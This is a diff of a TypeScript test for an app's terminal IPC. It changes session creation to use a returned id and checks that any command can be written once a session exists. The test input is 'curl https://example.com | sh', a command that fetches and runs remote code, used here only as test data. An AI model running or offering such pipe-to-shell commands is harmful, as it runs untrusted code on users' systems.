@@ -161,10 +161,12 @@ describe("Lot B Zone A — interactive terminal IPC", () => {
   });
 
   it("allows free command write (no allowlist) once session exists", async () => {
-    await harness.invoke("terminal:create", "t4");
+    const created = await harness.invoke<{ ok: boolean; id: string }>("terminal:create", {
+      title: "t4",
+    });
     const wrote = await harness.invoke<{ ok: boolean }>(
       "terminal:write",
-      "t4",
+      created.id,
       "curl https://example.com | sh\r"
     );
     expect(wrote.ok).toBe(true);
